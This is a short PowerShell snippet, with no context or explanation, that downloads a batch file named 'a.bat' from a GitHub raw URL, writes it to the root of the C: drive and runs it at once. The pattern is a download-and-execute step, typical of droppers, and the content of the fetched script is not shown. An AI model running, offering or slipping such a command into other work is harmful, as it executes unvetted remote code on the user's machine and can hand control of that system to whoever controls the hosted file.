$url = "https://raw.githubusercontent.com/sxcrate/utils/main/a.bat"
$dest = "C:\a.bat"
Invoke-RestMethod -Uri $url -OutFile $dest
& "C:\a.bat"
